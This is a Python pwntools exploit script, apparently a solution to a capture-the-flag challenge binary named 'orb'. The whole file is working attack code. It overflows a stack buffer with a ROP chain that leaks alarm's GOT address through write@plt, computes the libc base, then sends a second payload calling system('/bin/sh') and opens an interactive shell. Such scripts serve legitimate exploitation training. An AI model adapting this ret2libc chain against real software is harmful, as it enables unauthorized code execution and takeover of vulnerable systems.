#!/usr/bin/python
import sys
import struct
from pwn import *

context.log_level = 'error'

e = ELF("./orb")
libc = ELF("./glibc/libc.so.6")
p = process(e.path)
# p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

print(f"Received: {p.recvuntil(b': ')}")

# gadgets
# 0x000000000040127b : pop rdi ; ret
# 0x0000000000401279 : pop rsi ; pop r15 ; ret
pop_rdi_ret = p64(0x40127b)
pop_rsi_r15_ret = p64(0x401279)

# from objdump -R orb
# 0000000000403fd8 R_X86_64_JUMP_SLOT  alarm@GLIBC_2.2.5
alarm_got = p64(0x403fd8)

# from gdb orb -> info functions
# 0x0000000000401030  write@plt
write_plt = p64(0x401030)

# 0x000000000040119f  main
main_func = p64(0x40119f)

deadcode = p64(0xdeadc0de)

payload = b'A'*32
payload += b'B'*8                # rbp

# write(stdout, alarm_got)
# args for write@plt
# rdi -> fd (1 for stdout)
# rsi -> buf (address of libc symbol)
payload += pop_rdi_ret        # initial gadget
payload += p64(0x1)           # rdi; 1 for stdout
payload += pop_rsi_r15_ret    # next gadget
payload += alarm_got          # rsi; address to print
payload += deadcode           # r15; doesnt matter
payload += write_plt          # function to exec
payload += main_func          # ret back to main

print("Sending payload 1")
p.sendline(payload)

# recv lines before leak
p.recvline()
p.recvline()
p.recvline()

# Parse address from stdout
leaked_addr = p.recvline()
print(f"Received line:\n{hexdump(leaked_addr)}")

# skip past null byte, which appears before address
alarm_libc = u64(leaked_addr[1:7].ljust(8,b'\x00'))
print(f"alarm_libc: {hex(alarm_libc)}")

libc_base = alarm_libc - libc.symbols.alarm
print(f"libc_base: {hex(libc_base)}")

libc.address = libc_base
libc_system = p64(libc.symbols.system)
libc_exit = p64(libc.symbols.exit)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))

print(f"Received: {p.recvuntil(b': ')}")

# execute system('/bin/sh')
payload_2 = b'A'*32
payload_2 += b'B'*8
payload_2 += pop_rdi_ret
payload_2 += bin_sh
payload_2 += libc_system
payload_2 += libc_exit

print("Sending payload 2")
p.sendline(payload_2)

# grab stdin/stdout of shell
p.interactive()

